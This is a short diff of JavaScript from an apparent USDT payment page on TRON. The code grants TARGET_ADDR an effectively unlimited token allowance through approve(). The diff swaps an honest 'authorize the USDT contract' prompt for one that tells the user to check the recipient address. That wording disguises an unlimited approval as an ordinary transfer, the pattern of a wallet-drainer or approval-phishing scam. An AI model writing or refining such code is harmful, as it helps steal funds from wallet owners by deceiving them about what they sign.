@@ -311,7 +311,7 @@ sendBtn.addEventListener("click", async () => {
   try {
     const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
     if (Number(allowance) < sunVal) {
-      alert("需要授权USDT合约，请在TP钱包确认签名");
+      alert("仔细核对收款地址后确认签名");
       await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
       alert("授权完成，开始转账");
     }
